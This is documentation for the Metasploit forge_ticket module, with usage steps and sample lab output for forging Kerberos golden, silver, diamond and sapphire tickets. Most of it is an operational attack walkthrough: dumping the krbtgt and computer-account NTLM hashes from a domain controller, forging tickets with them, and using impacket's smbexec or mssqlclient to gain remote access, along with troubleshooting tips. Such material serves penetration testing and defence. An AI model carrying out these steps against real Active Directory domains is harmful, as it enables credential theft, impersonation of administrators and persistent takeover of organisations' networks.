## Kerberos Ticket Forging (Golden/Silver tickets)

The `auxiliary/admin/kerberos/forge_ticket` module allows the forging of a golden, silver, diamond or sapphire ticket.

## Vulnerable Application

Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL

## Actions

There are two kind of actions the module can run:

1. **FORGE_SILVER** - Forge a Silver ticket - forging a service ticket. [Default]
2. **FORGE_GOLDEN** - Forge a Golden ticket - forging a ticket granting ticket.
3. **FORGE_DIAMOND** - Forge a Diamond ticket - forging a ticket granting ticket by copying the PAC of another user.
4. **FORGE_SAPPHIRE** - Forge a Golden ticket - forging a ticket granting ticket by copying the PAC of a particular user, using the S4U2Self+U2U trick.

## Pre-Verification steps

1. Obtain your targets DOMAIN via your favorite method: e.g.
    `nmap <TARGET_IP>`
2. Next retrieve the DOMAIN_SID: e.g.
    `mimikatz # sekurlsa::logonpasswords`
    or
    `use auxiliary/gather/windows_secrets_dump`
3. Finally get the NTHASH or AES key (prefer AES key if available) of the service account you wish to target: e.g.
    `mimikatz # sekurlsa::logonpasswords` - this output contains both NTHASH and AES keys

## Module usage

1. Start msfconsole
2. Do: `use auxiliary/admin/kerberos/forge_ticket`
3. Do: `set DOMAIN DW.LOCAL`
4. Do: `set DOMAIN_SID S-1-5-21-1755879683-3641577184-3486455962`
5. Do: `set NTHASH 88E4D9FABAECF3DEC18DD80905521B29`
6. Do: `set USER fake_user`
7. Do: `set USER_RID 500`
8. Do: `set SPN MSSqlSvc/dc1.dw.local:1433` (Option only used for silver tickets)
9. Do: `forge_silver` to generate a silver ticket or `forge_golden` for a golden ticket
10. Use your ticket which will have been stored as loot with your chosen target
11. Example usage in impacket:
    ```
    export KRB5CCNAME=/path/to/ticket
    python3 mssqlclient.py DW.LOCAL/fake_mysql@dc1.dw.local -k -no-pass
    ```

## Scenarios

### Forge Golden ticket

Golden tickets can be used for persistence in an Active Directory environment. The forged golden ticket is actually a Ticket Granting Ticket (TGT) - which can be used to request arbitrary Service tickets. This module does not connect directly to a Key Distribution Center (KDC), it instead forges its own ticket.

Golden tickets can be forged using a stolen Kerberos `krbtgt` account, using a password hash in NTHASH format.

For golden ticket attacks, the following information is required:

1. `DOMAIN` - The domain, i.e.`adf3.local`
2. `DOMAIN_SID` - This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
3. `NTHASH` - The NTHASH for the krbtgt account, i.e. `767400b2c71afa35a5dca216f2389cd9`
4. `USER` - This username will be stored within the forged ticket, this must be a user that exists in Active Directory
5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`

One way of extracting the krbtgt account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:

```msf
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
[*] Running module against 192.168.123.13

[*] 192.168.123.13:445 - Service RemoteRegistry is already running
[*] 192.168.123.13:445 - Retrieving target system bootKey
[+] 192.168.123.13:445 - bootKey: 0xa03745c7a9597f105a4df1e84a5aef04

... omitted for brevity ...

[*] 192.168.123.13:445 - Decrypting NL$KM
[*] 192.168.123.13:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.123.13:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 192.168.123.13:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 192.168.123.13:445 - SID enumeration progress -  0 / 24 ( 0.00%)
[*] 192.168.123.13:445 - SID enumeration progress - 24 / 24 (  100%)
# SID's:
ADF3\Administrator: S-1-5-21-1266190811-2419310613-1856291569-500
ADF3\Guest: S-1-5-21-1266190811-2419310613-1856291569-501
ADF3\krbtgt: S-1-5-21-1266190811-2419310613-1856291569-502 <------------- Use the SID from here, the part before RID 502
ADF3\DefaultAccount: S-1-5-21-1266190811-2419310613-1856291569-503
ADF3\j.blogs: S-1-5-21-1266190811-2419310613-1856291569-1104
ADF3\admin: S-1-5-21-1266190811-2419310613-1856291569-1112
ADF3\DC3$: S-1-5-21-1266190811-2419310613-1856291569-1001
ADF3\WIN10-DC3$: S-1-5-21-1266190811-2419310613-1856291569-1608
ADF3\WIN11-DC3$: S-1-5-21-1266190811-2419310613-1856291569-1609

... omitted for brevity ...

# NTLM hashes:
ADF3\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ede47af254546a82b1743953cc4950:::
ADF3\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ADF3\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:767400b2c71afa35a5dca216f2389cd9::: <-- The krbtgt NTHASH
```

With the above information a golden ticket can be forged:

```msf
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=767400b2c71afa35a5dca216f2389cd9 user=Administrator

[+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
[*] Auxiliary module execution completed
```

This newly created golden ticket is a ticket granting ticket which can be used to generate service tickets without a username or password. Common services include WinRM, SMB, etc.

Example using a golden ticket with Metasploit:

Not currently currently supported.

Example using a golden ticket with impacket:

```
export KRB5CCNAME=/Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

If this is not working for you, there is a section dedicated to common errors below.

### Forging Silver ticket

A silver ticket is similar to a golden ticket. The user will compromise the password hash for a service or computer account to forge tickets which grant persistent access to services such as SMB/LDAP/MSSQL/etc.

For silver ticket attacks the following information is required:

1. `DOMAIN` - The domain, i.e.`adf3.local`
2. `DOMAIN_SID` This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
3. `NTHASH` - The NTHASH for the service or computer account, i.e. `767400b2c71afa35a5dca216f2389cd9`
4. `USER` - This username will be stored within the forged ticket, unlike with Golden tickets - this can be a non-existent user
5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`
6. `SPN` - The Service Principal name, i.e. `CIFS` for SMB access, or `MSSqlSvc/dc1.dw.local:1433`. Other examples can be seen by running `setspn -q */*` on the target

Example Service Principal Names:

| Service Type | Server Principal Name |
|--------------|-----------------------|
| WMI          | HOST or RPCSS         |
| WinRM        | HOST or HTTP          |
| SMB          | CIFS                  |
| LDAP         | LDAP                  |
| MSSQL        | MSSqlSvc              |

One way of extracting the computer account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:

```msf
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
[*] Running module against 192.168.123.13

[*] 192.168.123.13:445 - Service RemoteRegistry is already running
[*] 192.168.123.13:445 - Retrieving target system bootKey
[+] 192.168.123.13:445 - bootKey: 0xa03745c7a9597f105a4df1e84a5aef04

... omitted for brevity ...

[*] 192.168.123.13:445 - Decrypting NL$KM
[*] 192.168.123.13:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.123.13:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 192.168.123.13:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 192.168.123.13:445 - SID enumeration progress -  0 / 24 ( 0.00%)
[*] 192.168.123.13:445 - SID enumeration progress - 24 / 24 (  100%)
# SID's:
ADF3\Administrator: S-1-5-21-1266190811-2419310613-1856291569-500
ADF3\Guest: S-1-5-21-1266190811-2419310613-1856291569-501
ADF3\krbtgt: S-1-5-21-1266190811-2419310613-1856291569-502
ADF3\DefaultAccount: S-1-5-21-1266190811-2419310613-1856291569-503
ADF3\j.blogs: S-1-5-21-1266190811-2419310613-1856291569-1104
ADF3\admin: S-1-5-21-1266190811-2419310613-1856291569-1112
ADF3\DC3$: S-1-5-21-1266190811-2419310613-1856291569-1001 <------------- Use the SID from the targeted computer account, the part before RID 1001

... omitted for brevity ...

# NTLM hashes:
ADF3\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ede47af254546a82b1743953cc4950:::
ADF3\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ADF3\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:767400b2c71afa35a5dca216f2389cd9:::
... omitted for brevity ...
ADF3\DC3$:1001:aad3b435b51404eeaad3b435b51404ee:fbd103200439e14d4c8adad675d5f244::: <-- The NTHASH for the targeted computer account
```

With the above information a silver ticket for SMB can be forged for the target host:

```msf
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_SILVER domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=fbd103200439e14d4c8adad675d5f244 user=Administrator spn=cifs/dc3.adf3.local

[+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
[*] Auxiliary module execution completed
```

Example using a silver ticket with impacket:

```
export KRB5CCNAME=/Users/user/.msf4/loot/20220901132003_default_192.168.123.13_kerberos_ticket._554255.bin
python3 $code/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

### Forging Diamond ticket

A diamond ticket is just a golden ticket (thus requiring knowledge of the krbtgt hash), with an attempt to be stealthier, by:

- Performing an AS-REQ request to retrieve a TGT for any user
- Using the krbtgt hash to decrypt the real ticket
- Setting properties of the forged PAC to mirror those in the valid TGT
- Encrypting the forged ticket with the krbtgt hash

The primary requirement of a Diamond ticket is the same: knowledge of the krbtgt hash of the domain.
The `DOMAIN_SID` property is not required, as this is retrieved from the valid TGT.

To perform the first step (retrieving the TGT), you must provide sufficient information to authenticate to the domain
(i.e. `RHOST`, `USERNAME` and `PASSWORD`).

### Forging Sapphire ticket

A sapphire ticket is similar to a Diamond ticket, in that it retrieves a real TGT, and copies data from that PAC onto the forged ticket. However,
instead of using the ticket retrieved in the initial authentication, an additional step is performed to retrieve a PAC for another (presumably 
high-privilege) user:

- Authenticating to the KDC
- Using the S4U2Self and U2U extensions to request a TGS for a high-privilege user (this mirrors what the real user's PAC would look like, but the ticket is unusable in high-privilege contexts)
- Decrypt this information
- Setting properties of the forged PAC to mirror those in the valid TGT
- Encrypting the forged ticket with the krbtgt hash

The primary requirement of a Sapphire ticket is the same as for Golden and Diamond tickets: knowledge of the krbtgt hash of the domain.
The `DOMAIN_SID` and `DOMAIN_RID` properties are not required, as this is retrieved from the valid TGT.

To perform the first step (retrieving the TGT), you must provide sufficient information to authenticate to the domain
(i.e. `RHOST`, `USERNAME` and `PASSWORD`).

### Common Mistakes

**Invalid hostname**

Use the full hostname of the machine you are targeting, not just the domain:

```diff
- python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@adf3.local' -dc-ip 192.168.123.13 -k -no-pass
+ python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

**Invalid SPN**

SPNs must be in the format `*/*`. If this is not identical to what Active Directory is configured with, it will not work.

**Verbose Mode**

If you `set Verbose true` you will set the module to run in a more verbose mode.
This would be useful in cases where the ticket you are forging does not work as expected and in this case
we print out the contents of the ticket after it's been forged similar to the `inspect_ticket` module with the key supplied.
